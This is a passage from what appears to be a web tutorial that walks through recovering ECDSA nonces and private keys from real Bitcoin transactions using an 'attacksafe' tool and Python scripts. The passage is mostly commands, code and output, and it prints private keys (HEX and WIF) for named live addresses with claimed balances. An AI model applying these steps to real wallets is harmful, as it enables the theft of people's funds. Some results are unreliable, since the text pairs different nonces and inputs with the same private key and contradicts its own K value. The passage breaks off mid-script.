<pre class="wp-block-code"><code>python2 breakECDSA.py 0100000001d5ecb7299d4005bc1c9bb2325de6428a882a6df8fefd74e740139a6b53bdb40e060000006b4830450221009cff5d8357756520391438c44415c706036e9e16d440cb8892e4b91423f0f67502204e8eaec16ebb4816d53cd08f882221c37db6aed27b5c77a0cb12455af91200ac012103c1915f97b2480c478e6b1111ae03c29f55013351a126b7f0cfbab4a34f3c712bffffffff010000000000000000046a02445300000000
</code></pre>



<figure class="wp-block-image"><img src="./Implement Frey-Rück Attack to get the secret key_K_NONCE_files/image-75-1024x256.png" alt="Implement Frey-Rück Attack to get the secret key &quot;K&quot; (NONCE)" class="wp-image-1045"></figure>



<pre class="wp-block-code"><code>R = 0x9cff5d8357756520391438c44415c706036e9e16d440cb8892e4b91423f0f675
S = 0x4e8eaec16ebb4816d53cd08f882221c37db6aed27b5c77a0cb12455af91200ac
Z = 0xccbd1c0f0ef3f70fb985e64184014998a8435078b7bb75e51ca6ae1c37aa30e1</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p>To get the secret key from a vulnerable ECDSA signing transaction, let’s add the data&nbsp;<code>RawTX</code>to a text document and save it as a file<code>RawTX.txt</code></p>



<pre class="wp-block-code"><code>0100000001d5ecb7299d4005bc1c9bb2325de6428a882a6df8fefd74e740139a6b53bdb40e060000006b4830450221009cff5d8357756520391438c44415c706036e9e16d440cb8892e4b91423f0f67502204e8eaec16ebb4816d53cd08f882221c37db6aed27b5c77a0cb12455af91200ac012103c1915f97b2480c478e6b1111ae03c29f55013351a126b7f0cfbab4a34f3c712bffffffff010000000000000000046a02445300000000</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Launch&nbsp;<code>-tool frey_ruck_attack</code>using software<code>“ATTACKSAFE SOFTWARE”</code></h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<pre class="wp-block-code"><code>./attacksafe -tool frey_ruck_attack -open RawTX.txt -save SecretKey.txt</code></pre>



<figure class="wp-block-image"><img src="./Implement Frey-Rück Attack to get the secret key_K_NONCE_files/image-76-1024x321.png" alt="Implement Frey-Rück Attack to get the secret key &quot;K&quot; (NONCE)" class="wp-image-1047"></figure>



<p>We launched this attack from&nbsp;<code>-tool frey_ruck_attack</code>and the result was saved to a file<code>SecretKey.txt</code></p>



<p>Now to see the successful result, open the file<code>SecretKey.txt</code></p>



<pre class="wp-block-code"><code>cat SecretKey.txt</code></pre>



<figure class="wp-block-image"><img src="./Implement Frey-Rück Attack to get the secret key_K_NONCE_files/image-77-1024x453.png" alt="Implement Frey-Rück Attack to get the secret key &quot;K&quot; (NONCE)" class="wp-image-1049"></figure>



<pre class="wp-block-code"><code>Deployments ECDSA:

SecretKey = 0x459733bf6c7972a0d894fe84e14b06803405e82d8fd1572d3376ff99049def4f

RawTX = 0100000001d5ecb7299d4005bc1c9bb2325de6428a882a6df8fefd74e740139a6b53bdb40e060000006b4830450221009cff5d8357756520391438c44415c706036e9e16d440cb8892e4b91423f0f67502204e8eaec16ebb4816d53cd08f882221c37db6aed27b5c77a0cb12455af91200ac012103c1915f97b2480c478e6b1111ae03c29f55013351a126b7f0cfbab4a34f3c712bffffffff010000000000000000046a02445300000000</code></pre>



<p>We see an inscription&nbsp;<code>"Deployments ECDSA"</code>that means a critical vulnerability in the Bitcoin blockchain transaction.</p>



<p><code>SecretKey value in HEX format, this is our secret key "K" (NONCE):</code></p>



<p><code>K = 0x459733bf6c7972a0d894fe84e14b06803405e82d8fd1572d3376ff99049def4f</code></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Let’s check with a&nbsp;<em>Python</em>&nbsp;script<code>point2gen.py</code></h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p><a href="https://pypi.org/project/ECPy/" target="_blank" rel="noreferrer noopener"><strong>Let’s use the ECPy</strong></a>&nbsp;elliptic curve library&nbsp;:</p>



<p>Now let’s run the script by specifying&nbsp;<code>secret key"K" (NONCE)</code>:</p>



<pre class="wp-block-code"><code>python3 point2gen.py 0x459733bf6c7972a0d894fe84e14b06803405e82d8fd1572d3376ff99049def4f</code></pre>



<figure class="wp-block-image"><img src="./Implement Frey-Rück Attack to get the secret key_K_NONCE_files/image-78-1024x92.png" alt="Implement Frey-Rück Attack to get the secret key &quot;K&quot; (NONCE)" class="wp-image-1051"></figure>



<p><code>(0x9cff5d8357756520391438c44415c706036e9e16d440cb8892e4b91423f0f675 , 0x79751db08bb33615fbdf6387f5f0f28c6702213eb20607e28760af1aaaeb273e)</code></p>



<p>Checking the coordinates of a point&nbsp;<code>EC (secp256k1)&nbsp;</code>with a signature value<code>R</code></p>



<pre class="wp-block-code"><code>R = 0x9cff5d8357756520391438c44415c706036e9e16d440cb8892e4b91423f0f675
S = 0x4e8eaec16ebb4816d53cd08f882221c37db6aed27b5c77a0cb12455af91200ac
Z = 0xccbd1c0f0ef3f70fb985e64184014998a8435078b7bb75e51ca6ae1c37aa30e1</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<pre class="wp-block-code"><code>R          =    0x9cff5d8357756520391438c44415c706036e9e16d440cb8892e4b91423f0f675
point2gen  =   (0x9cff5d8357756520391438c44415c706036e9e16d440cb8892e4b91423f0f675 , 0x79751db08bb33615fbdf6387f5f0f28c6702213eb20607e28760af1aaaeb273e)
</code></pre>



<p><code>ALL CORRECT!</code></p>



<p><code>K = 0x459733bf6c7972a0d894fe84e14b06803405e82d8fd1572d3376ff99049def4f</code></p>



<p>Now knowing the secret key, we can get the private key to the Bitcoin Wallet:<code>12Pm2muhQKuVtAHwJzdaiSLRa9QxgLpx5Q</code></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Let’s use&nbsp; the&nbsp;<em>Python</em>&nbsp;script:&nbsp;&nbsp;<code>calculate.py</code>&nbsp;&gt; &gt; &gt; Get the Private Key</h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p>Let’s open the code and add all the value of the signatures<code><strong>K, R, S, Z</strong></code></p>



<pre class="wp-block-code"><code>def h(n):
    return hex(n).replace("0x","")

def extended_gcd(aa, bb):
    lastremainder, remainder = abs(aa), abs(bb)
    x, lastx, y, lasty = 0, 1, 1, 0
    while remainder:
        lastremainder, (quotient, remainder) = remainder, divmod(lastremainder, remainder)
        x, lastx = lastx - quotient*x, x
        y, lasty = lasty - quotient*y, y
    return lastremainder, lastx * (-1 if aa &lt; 0 else 1), lasty * (-1 if bb &lt; 0 else 1)

def modinv(a, m):
    g, x, y = extended_gcd(a, m)
    if g != 1:
        raise ValueError
    return x % m
    
N = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141


K = 0x459733bf6c7972a0d894fe84e14b06803405e82d8fd1572d3376ff99049def4f
R = 0x9cff5d8357756520391438c44415c706036e9e16d440cb8892e4b91423f0f675
S = 0x4e8eaec16ebb4816d53cd08f882221c37db6aed27b5c77a0cb12455af91200ac
Z = 0xccbd1c0f0ef3f70fb985e64184014998a8435078b7bb75e51ca6ae1c37aa30e1


print (h((((S * K) - Z) * modinv(R,N)) % N))</code></pre>



<h2>The script will calculate the private key using the formula:</h2>



<p><code>Privkey = ((((S * K) - Z) * modinv(R,N)) % N)</code></p>



<p>Let’s run the script:</p>



<pre class="wp-block-code"><code>python3 calculate.py</code></pre>



<figure class="wp-block-image"><img src="./Implement Frey-Rück Attack to get the secret key_K_NONCE_files/image-79.png" alt="Implement Frey-Rück Attack to get the secret key &quot;K&quot; (NONCE)" class="wp-image-1053"></figure>



<p><code>PrivKey = 4d063c9a389df945ede5fa1a5d19408944d74d449d722548b3d8c80606e05b06</code></p>



<p><strong><a href="https://cryptodeep.ru/bitaddress.html" target="_blank" rel="noreferrer noopener">Let’s open bitaddress</a></strong>&nbsp;and&nbsp;check:</p>



<pre class="wp-block-code"><code>ADDR: 12Pm2muhQKuVtAHwJzdaiSLRa9QxgLpx5Q
WIF:  KyoSFYtgbsWxtfFZmMfbkwFTXhqfGgxztVgmuN1dFrPqs3nFCqcr
HEX:  4d063c9a389df945ede5fa1a5d19408944d74d449d722548b3d8c80606e05b06</code></pre>



<figure class="wp-block-image"><img src="./Implement Frey-Rück Attack to get the secret key_K_NONCE_files/a4.png" alt="Implement Frey-Rück Attack to get the secret key &quot;K&quot; (NONCE)" class="wp-image-886"></figure>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p><a href="https://www.blockchain.com/btc/address/12Pm2muhQKuVtAHwJzdaiSLRa9QxgLpx5Q">https://www.blockchain.com/btc/address/12Pm2muhQKuVtAHwJzdaiSLRa9QxgLpx5Q</a></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p><code>Private Key Found!</code></p>



<figure class="wp-block-image"><img src="./Implement Frey-Rück Attack to get the secret key_K_NONCE_files/image-23-1024x450.png" alt="Implement Frey-Rück Attack to get the secret key &quot;K&quot; (NONCE)" class="wp-image-889"></figure>



<p><code>BALANCE: $ 706.27</code></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote"><p><em>The potential threat of losing BTC coins lies in the critical vulnerability of the Bitcoin blockchain transaction, so we strongly recommend that everyone always update the software and use only verified devices.</em></p></blockquote>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p>With detailed cryptanalysis, we also found a critical vulnerability in&nbsp;<strong><a href="https://btc.exan.tech/tx/4ff10d8a7246f0c46acb9fefa6ea23497f6b7825307414ca3fc80bcbae9194af" target="_blank" rel="noreferrer noopener">4ff10d8a7246f0c46acb9fefa6ea23497f6b7825307414ca3fc80bcbae9194af</a></strong>&nbsp;for the same Bitcoin Address<strong><code>&nbsp;TXID:</code></strong><strong><a href="https://btc.exan.tech/tx/4ff10d8a7246f0c46acb9fefa6ea23497f6b7825307414ca3fc80bcbae9194af" target="_blank" rel="noreferrer noopener"></a></strong></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Prepare RawTX for the attack</h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote"><p><strong><a href="https://btc.exan.tech/address/12Pm2muhQKuVtAHwJzdaiSLRa9QxgLpx5Q" target="_blank" rel="noreferrer noopener">12Pm2muhQKuVtAHwJzdaiSLRa9QxgLpx5Q</a></strong></p><p><a href="https://btc.exan.tech/tx/4ff10d8a7246f0c46acb9fefa6ea23497f6b7825307414ca3fc80bcbae9194af" target="_blank" rel="noreferrer noopener">https://btc.exan.tech/tx/4ff10d8a7246f0c46acb9fefa6ea23497f6b7825307414ca3fc80bcbae9194af</a></p></blockquote>



<figure class="wp-block-image"><img src="./Implement Frey-Rück Attack to get the secret key_K_NONCE_files/image-24-1024x94.png" alt="Implement Frey-Rück Attack to get the secret key &quot;K&quot; (NONCE)" class="wp-image-894"></figure>



<pre class="wp-block-code"><code>RawTX = 010000000171f0257c63793fe24cf20cecb7e77926e950287c535cd0f99a57d001630bee53160000006b4830450220481b75700708a950ce88c97a84d7eef9844642ae0406db86c6384da093b22996022100abd9db597dbaaf4866e8379fd1127c017fa904756e7aa8559831c75bd925037a012103c1915f97b2480c478e6b1111ae03c29f55013351a126b7f0cfbab4a34f3c712bffffffff010000000000000000046a02585800000000
</code></pre>



<h2>Now we need to get all R, S, Z values ​​from all vulnerable transactions</h2>



<p>Let’s use the breakECDSA.py script</p>



<pre class="wp-block-code"><code>python2 breakECDSA.py 010000000171f0257c63793fe24cf20cecb7e77926e950287c535cd0f99a57d001630bee53160000006b4830450220481b75700708a950ce88c97a84d7eef9844642ae0406db86c6384da093b22996022100abd9db597dbaaf4866e8379fd1127c017fa904756e7aa8559831c75bd925037a012103c1915f97b2480c478e6b1111ae03c29f55013351a126b7f0cfbab4a34f3c712bffffffff010000000000000000046a02585800000000
</code></pre>



<figure class="wp-block-image"><img src="./Implement Frey-Rück Attack to get the secret key_K_NONCE_files/image-81-1024x253.png" alt="Implement Frey-Rück Attack to get the secret key &quot;K&quot; (NONCE)" class="wp-image-1057"></figure>



<pre class="wp-block-code"><code>R = 0x481b75700708a950ce88c97a84d7eef9844642ae0406db86c6384da093b22996
S = 0xabd9db597dbaaf4866e8379fd1127c017fa904756e7aa8559831c75bd925037a
Z = 0x6bd83b8efbba3aaeea89f4763a13f837181c42c82dfb223d8354f109b5ec65fe</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p>To get the secret key from a vulnerable ECDSA signing transaction, let’s add the data&nbsp;<code>RawTX</code>to a text document and save it as a file<code>RawTX.txt</code></p>



<pre class="wp-block-code"><code>010000000171f0257c63793fe24cf20cecb7e77926e950287c535cd0f99a57d001630bee53160000006b4830450220481b75700708a950ce88c97a84d7eef9844642ae0406db86c6384da093b22996022100abd9db597dbaaf4866e8379fd1127c017fa904756e7aa8559831c75bd925037a012103c1915f97b2480c478e6b1111ae03c29f55013351a126b7f0cfbab4a34f3c712bffffffff010000000000000000046a02585800000000</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Launch&nbsp;<code>-tool frey_ruck_attack</code>using software<code>“ATTACKSAFE SOFTWARE”</code></h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<pre class="wp-block-code"><code>./attacksafe -tool frey_ruck_attack -open RawTX.txt -save SecretKey.txt</code></pre>



<figure class="wp-block-image"><img src="./Implement Frey-Rück Attack to get the secret key_K_NONCE_files/image-82-1024x307.png" alt="Implement Frey-Rück Attack to get the secret key &quot;K&quot; (NONCE)" class="wp-image-1059"></figure>



<p>We launched this attack from&nbsp;<code>-tool frey_ruck_attack</code>and the result was saved to a file<code>SecretKey.txt</code></p>



<p>Now to see the successful result, open the file<code>SecretKey.txt</code></p>



<pre class="wp-block-code"><code>cat SecretKey.txt</code></pre>



<figure class="wp-block-image"><img src="./Implement Frey-Rück Attack to get the secret key_K_NONCE_files/image-83-1024x459.png" alt="Implement Frey-Rück Attack to get the secret key &quot;K&quot; (NONCE)" class="wp-image-1061"></figure>



<pre class="wp-block-code"><code>Deployments ECDSA:

SecretKey = 0xad004724cdf368d6ffcc49791827c9157f533a53e687d7eae1547c848d49e1cd

RawTX = 010000000171f0257c63793fe24cf20cecb7e77926e950287c535cd0f99a57d001630bee53160000006b4830450220481b75700708a950ce88c97a84d7eef9844642ae0406db86c6384da093b22996022100abd9db597dbaaf4866e8379fd1127c017fa904756e7aa8559831c75bd925037a012103c1915f97b2480c478e6b1111ae03c29f55013351a126b7f0cfbab4a34f3c712bffffffff010000000000000000046a02585800000000</code></pre>



<p>We see an inscription&nbsp;<code>"Deployments ECDSA"</code>that means a critical vulnerability in the Bitcoin blockchain transaction.</p>



<p><code>SecretKey value in HEX format, this is our secret key "K" (NONCE):</code></p>



<p><code>K = 0x459733bf6c7972a0d894fe84e14b06803405e82d8fd1572d3376ff99049def4f</code></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Let’s check with a&nbsp;<em>Python</em>&nbsp;script<code>point2gen.py</code></h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p><a href="https://pypi.org/project/ECPy/" target="_blank" rel="noreferrer noopener"><strong>Let’s use the ECPy</strong></a>&nbsp;elliptic curve library&nbsp;:</p>



<p>Now let’s run the script by specifying&nbsp;<code>secret key "K" (NONCE)</code>:</p>



<pre class="wp-block-code"><code>python3 point2gen.py 0xad004724cdf368d6ffcc49791827c9157f533a53e687d7eae1547c848d49e1cd</code></pre>



<figure class="wp-block-image"><img src="./Implement Frey-Rück Attack to get the secret key_K_NONCE_files/image-84-1024x89.png" alt="Implement Frey-Rück Attack to get the secret key &quot;K&quot; (NONCE)" class="wp-image-1062"></figure>



<p><code>(0x481b75700708a950ce88c97a84d7eef9844642ae0406db86c6384da093b22996 , 0xbd48d7b4dc1d36c3e4e18ea398ce153f3ebf6ddf7824d0d0132e5dad85c3c69d)</code></p>



<p>Checking the coordinates of a point&nbsp;<code>EC (secp256k1)&nbsp;</code>with a signature value<code>R</code></p>



<pre class="wp-block-code"><code>R = 0x481b75700708a950ce88c97a84d7eef9844642ae0406db86c6384da093b22996
S = 0xabd9db597dbaaf4866e8379fd1127c017fa904756e7aa8559831c75bd925037a
Z = 0x6bd83b8efbba3aaeea89f4763a13f837181c42c82dfb223d8354f109b5ec65fe</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<pre class="wp-block-code"><code>R          =    0x481b75700708a950ce88c97a84d7eef9844642ae0406db86c6384da093b22996
point2gen  =   (0x481b75700708a950ce88c97a84d7eef9844642ae0406db86c6384da093b22996 , 0xbd48d7b4dc1d36c3e4e18ea398ce153f3ebf6ddf7824d0d0132e5dad85c3c69d)
</code></pre>



<p><code>ALL CORRECT!</code></p>



<p><code>K = 0xad004724cdf368d6ffcc49791827c9157f533a53e687d7eae1547c848d49e1cd</code></p>



<p>Now knowing the secret key, we can get the private key to the Bitcoin Wallet:<code>12Pm2muhQKuVtAHwJzdaiSLRa9QxgLpx5Q</code></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Let’s use&nbsp; the&nbsp;<em>Python</em>&nbsp;script:&nbsp;&nbsp;<code>calculate.py</code>&nbsp;&gt; &gt; &gt; Get the Private Key</h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p>Let’s open the code and add all the value of the signatures<code><strong>K, R, S, Z</strong></code></p>



<pre class="wp-block-code"><code>def h(n):
    return hex(n).replace("0x","")

def extended_gcd(aa, bb):
    lastremainder, remainder = abs(aa), abs(bb)
    x, lastx, y, lasty = 0, 1, 1, 0
    while remainder:
        lastremainder, (quotient, remainder) = remainder, divmod(lastremainder, remainder)
        x, lastx = lastx - quotient*x, x
        y, lasty = lasty - quotient*y, y
    return lastremainder, lastx * (-1 if aa &lt; 0 else 1), lasty * (-1 if bb &lt; 0 else 1)

def modinv(a, m):
    g, x, y = extended_gcd(a, m)
    if g != 1:
        raise ValueError
    return x % m
    
N = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141


K = 0xad004724cdf368d6ffcc49791827c9157f533a53e687d7eae1547c848d49e1cd
R = 0x481b75700708a950ce88c97a84d7eef9844642ae0406db86c6384da093b22996
S = 0xabd9db597dbaaf4866e8379fd1127c017fa904756e7aa8559831c75bd925037a
Z = 0x6bd83b8efbba3aaeea89f4763a13f837181c42c82dfb223d8354f109b5ec65fe


print (h((((S * K) - Z) * modinv(R,N)) % N))</code></pre>



<h2>The script will calculate the private key using the formula:</h2>



<p><code>Privkey = ((((S * K) - Z) * modinv(R,N)) % N)</code></p>



<p>Let’s run the script:</p>



<pre class="wp-block-code"><code>python3 calculate.py</code></pre>



<figure class="wp-block-image"><img src="./Implement Frey-Rück Attack to get the secret key_K_NONCE_files/image-85.png" alt="Implement Frey-Rück Attack to get the secret key &quot;K&quot; (NONCE)" class="wp-image-1064"></figure>



<p><code>PrivKey = 4d063c9a389df945ede5fa1a5d19408944d74d449d722548b3d8c80606e05b06</code></p>



<p><strong><a href="https://cryptodeep.ru/bitaddress.html" target="_blank" rel="noreferrer noopener">Let’s open bitaddress</a></strong>&nbsp;and&nbsp;check:</p>



<pre class="wp-block-code"><code>ADDR: 12Pm2muhQKuVtAHwJzdaiSLRa9QxgLpx5Q
WIF:  KyoSFYtgbsWxtfFZmMfbkwFTXhqfGgxztVgmuN1dFrPqs3nFCqcr
HEX:  4d063c9a389df945ede5fa1a5d19408944d74d449d722548b3d8c80606e05b06</code></pre>



<figure class="wp-block-image"><img src="./Implement Frey-Rück Attack to get the secret key_K_NONCE_files/a4.png" alt="Implement Frey-Rück Attack to get the secret key &quot;K&quot; (NONCE)" class="wp-image-886"></figure>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p><a href="https://www.blockchain.com/btc/address/12Pm2muhQKuVtAHwJzdaiSLRa9QxgLpx5Q">https://www.blockchain.com/btc/address/12Pm2muhQKuVtAHwJzdaiSLRa9QxgLpx5Q</a></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p><code>Private Key Found!</code></p>



<figure class="wp-block-image"><img src="./Implement Frey-Rück Attack to get the secret key_K_NONCE_files/image-23-1024x450.png" alt="Implement Frey-Rück Attack to get the secret key &quot;K&quot; (NONCE)" class="wp-image-889"></figure>



<p><code>BALANCE: $ 706.27</code></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p><strong><code>№5</code></strong></p>



<p>With detailed cryptanalysis, we also found a critical vulnerability in Bitcoin Address:</p>



<blockquote class="wp-block-quote"><p><strong><a href="https://btc.exan.tech/address/19BRiDqZfYxU4K3DCWAfbh925cr7L4Q8ac" target="_blank" rel="noreferrer noopener">19BRiDqZfYxU4K3DCWAfbh925cr7L4Q8ac</a></strong></p><p><a href="https://btc.exan.tech/tx/492955688cff583fa5b6677bcb9a90a3010925f7e2204fd464e0e7183a6954db" target="_blank" rel="noreferrer noopener">https://btc.exan.tech/tx/492955688cff583fa5b6677bcb9a90a3010925f7e2204fd464e0e7183a6954db</a></p><p><a href="https://btc.exan.tech/tx/e3dfc0d3b61972d04446214481d8e54623e5e0f2aaf26d7bc01fe5081249b4ea" target="_blank" rel="noreferrer noopener">https://btc.exan.tech/tx/e3dfc0d3b61972d04446214481d8e54623e5e0f2aaf26d7bc01fe5081249b4ea</a></p></blockquote>



<figure class="wp-block-image"><img src="./Implement Frey-Rück Attack to get the secret key_K_NONCE_files/image-9.png" alt="Implement Frey-Rück Attack to get the secret key &quot;K&quot; (NONCE)" class="wp-image-673"></figure>



<figure class="wp-block-image"><img src="./Implement Frey-Rück Attack to get the secret key_K_NONCE_files/image-10.png" alt="Implement Frey-Rück Attack to get the secret key &quot;K&quot; (NONCE)" class="wp-image-675"></figure>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Prepare RawTX for the attack</h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote"><p><strong><a href="https://btc.exan.tech/address/19BRiDqZfYxU4K3DCWAfbh925cr7L4Q8ac" target="_blank" rel="noreferrer noopener">19BRiDqZfYxU4K3DCWAfbh925cr7L4Q8ac</a></strong></p><p><a href="https://btc.exan.tech/tx/492955688cff583fa5b6677bcb9a90a3010925f7e2204fd464e0e7183a6954db" target="_blank" rel="noreferrer noopener">https://btc.exan.tech/tx/492955688cff583fa5b6677bcb9a90a3010925f7e2204fd464e0e7183a6954db</a></p></blockquote>



<figure class="wp-block-image"><img src="./Implement Frey-Rück Attack to get the secret key_K_NONCE_files/image-25-1024x94.png" alt="Implement Frey-Rück Attack to get the secret key &quot;K&quot; (NONCE)" class="wp-image-908"></figure>



<pre class="wp-block-code"><code>RawTX = 0100000001b5bdf3eeeb068c2ca42bd8f65fc617875ab556afcff4a3de307674be180a7ab3070000006a47304402202bf4a846fe0d4c967c15a90eb56365576e42563b7257cbc280def5936817ec4e022054cb84ac0ce9a6e2e4cbc22f814f1d83c4ef04d55da730761d202158bdb690580121023a936a1116ee1d51eceef530daf519824a89a3985c9eaa1c58cfcd2c78830903ffffffff010000000000000000046a02445300000000
</code></pre>



<h2>Now we need to get all R, S, Z values ​​from all vulnerable transactions</h2>



<p>Let’s use the breakECDSA.py script</p>



<pre class="wp-block-code"><code>python2 breakECDSA.py 0100000001b5bdf3eeeb068c2ca42bd8f65fc617875ab556afcff4a3de307674be180a7ab3070000006a47304402202bf4a846fe0d4c967c15a90eb56365576e42563b7257cbc280def5936817ec4e022054cb84ac0ce9a6e2e4cbc22f814f1d83c4ef04d55da730761d202158bdb690580121023a936a1116ee1d51eceef530daf519824a89a3985c9eaa1c58cfcd2c78830903ffffffff010000000000000000046a02445300000000
</code></pre>



<figure class="wp-block-image"><img src="./Implement Frey-Rück Attack to get the secret key_K_NONCE_files/image-86-1024x253.png" alt="Implement Frey-Rück Attack to get the secret key &quot;K&quot; (NONCE)" class="wp-image-1067"></figure>



<pre class="wp-block-code"><code>R = 0x2bf4a846fe0d4c967c15a90eb56365576e42563b7257cbc280def5936817ec4e
S = 0x54cb84ac0ce9a6e2e4cbc22f814f1d83c4ef04d55da730761d202158bdb69058
Z = 0x4af38c561f0c46e2b0e78d5ab4aae0c82dc3f0affb15717064d8c63ee0c9330e</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p>To get the secret key from a vulnerable ECDSA signing transaction, let’s add the data&nbsp;<code>RawTX</code>to a text document and save it as a file<code>RawTX.txt</code></p>



<pre class="wp-block-code"><code>0100000001b5bdf3eeeb068c2ca42bd8f65fc617875ab556afcff4a3de307674be180a7ab3070000006a47304402202bf4a846fe0d4c967c15a90eb56365576e42563b7257cbc280def5936817ec4e022054cb84ac0ce9a6e2e4cbc22f814f1d83c4ef04d55da730761d202158bdb690580121023a936a1116ee1d51eceef530daf519824a89a3985c9eaa1c58cfcd2c78830903ffffffff010000000000000000046a02445300000000</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Launch&nbsp;<code>-tool frey_ruck_attack</code>using software<code>“ATTACKSAFE SOFTWARE”</code></h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<pre class="wp-block-code"><code>./attacksafe -tool frey_ruck_attack -open RawTX.txt -save SecretKey.txt</code></pre>



<figure class="wp-block-image"><img src="./Implement Frey-Rück Attack to get the secret key_K_NONCE_files/image-87-1024x318.png" alt="Implement Frey-Rück Attack to get the secret key &quot;K&quot; (NONCE)" class="wp-image-1069"></figure>



<p>We launched this attack from&nbsp;<code>-tool frey_ruck_attack</code>and the result was saved to a file<code>SecretKey.txt</code></p>



<p>Now to see the successful result, open the file<code>SecretKey.txt</code></p>



<pre class="wp-block-code"><code>cat SecretKey.txt</code></pre>



<figure class="wp-block-image"><img src="./Implement Frey-Rück Attack to get the secret key_K_NONCE_files/image-88-1024x453.png" alt="Implement Frey-Rück Attack to get the secret key &quot;K&quot; (NONCE)" class="wp-image-1070"></figure>



<pre class="wp-block-code"><code>Deployments ECDSA:

SecretKey = 0xb1f4054cff1df58822bb4085f7fb23c95c37bdd037dc1df01be68a8ca85f6d55

RawTX = 0100000001b5bdf3eeeb068c2ca42bd8f65fc617875ab556afcff4a3de307674be180a7ab3070000006a47304402202bf4a846fe0d4c967c15a90eb56365576e42563b7257cbc280def5936817ec4e022054cb84ac0ce9a6e2e4cbc22f814f1d83c4ef04d55da730761d202158bdb690580121023a936a1116ee1d51eceef530daf519824a89a3985c9eaa1c58cfcd2c78830903ffffffff010000000000000000046a02445300000000</code></pre>



<p>We see an inscription&nbsp;<code>"Deployments ECDSA"</code>that means a critical vulnerability in the Bitcoin blockchain transaction.</p>



<p><code>SecretKey value in HEX format, this is our secret key "K" (NONCE):</code></p>



<p><code>K = 0xb1f4054cff1df58822bb4085f7fb23c95c37bdd037dc1df01be68a8ca85f6d55</code></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Let’s check with a&nbsp;<em>Python</em>&nbsp;script<code>point2gen.py</code></h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p><a href="https://pypi.org/project/ECPy/" target="_blank" rel="noreferrer noopener"><strong>Let’s use the ECPy</strong></a>&nbsp;elliptic curve library&nbsp;:</p>



<p>Now let’s run the script by specifying&nbsp;<code>secret key "K" (NONCE)</code>:</p>



<pre class="wp-block-code"><code>python3 point2gen.py 0xb1f4054cff1df58822bb4085f7fb23c95c37bdd037dc1df01be68a8ca85f6d55</code></pre>



<figure class="wp-block-image"><img src="./Implement Frey-Rück Attack to get the secret key_K_NONCE_files/image-89-1024x98.png" alt="Implement Frey-Rück Attack to get the secret key &quot;K&quot; (NONCE)" class="wp-image-1075"></figure>



<p><code>(0x2bf4a846fe0d4c967c15a90eb56365576e42563b7257cbc280def5936817ec4e , 0x8df094a6760490d279c350cf34f5ae35fd6cfea9dafd63d02d500e01ca67bcb3)</code></p>



<p>Checking the coordinates of a point&nbsp;<code>EC (secp256k1)&nbsp;</code>with a signature value<code>R</code></p>



<pre class="wp-block-code"><code>R = 0x2bf4a846fe0d4c967c15a90eb56365576e42563b7257cbc280def5936817ec4e
S = 0x54cb84ac0ce9a6e2e4cbc22f814f1d83c4ef04d55da730761d202158bdb69058
Z = 0x4af38c561f0c46e2b0e78d5ab4aae0c82dc3f0affb15717064d8c63ee0c9330e</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<pre class="wp-block-code"><code>R          =    0x2bf4a846fe0d4c967c15a90eb56365576e42563b7257cbc280def5936817ec4e
point2gen  =   (0x2bf4a846fe0d4c967c15a90eb56365576e42563b7257cbc280def5936817ec4e , 0x8df094a6760490d279c350cf34f5ae35fd6cfea9dafd63d02d500e01ca67bcb3)
</code></pre>



<p><code>ALL CORRECT!</code></p>



<p><code>K = 0xb1f4054cff1df58822bb4085f7fb23c95c37bdd037dc1df01be68a8ca85f6d55</code></p>



<p>Now knowing the secret key, we can get the private key to the Bitcoin Wallet:<code>19BRiDqZfYxU4K3DCWAfbh925cr7L4Q8ac</code></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Let’s use&nbsp; the&nbsp;<em>Python</em>&nbsp;script:&nbsp;&nbsp;<code>calculate.py</code>&nbsp;&gt; &gt; &gt; Get the Private Key</h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p>Let’s open the code and add all the value of the signatures<code><strong>K, R, S, Z</strong></code></p>



<pre class="wp-block-code"><code>def h(n):
    return hex(n).replace("0x","")

def extended_gcd(aa, bb):
    lastremainder, remainder = abs(aa), abs(bb)
    x, lastx, y, lasty = 0, 1, 1, 0
    while remainder:
        lastremainder, (quotient, remainder) = remainder, divmod(lastremainder, remainder)
        x, lastx = lastx - quotient*x, x
        y, lasty = lasty - quotient*y, y
    return lastremainder, lastx * (-1 if aa &lt; 0 else 1), lasty * (-1 if bb &lt; 0 else 1)

def modinv(a, m):
    g, x, y = extended_gcd(a, m)
    if g != 1:
        raise ValueError
    return x % m
    
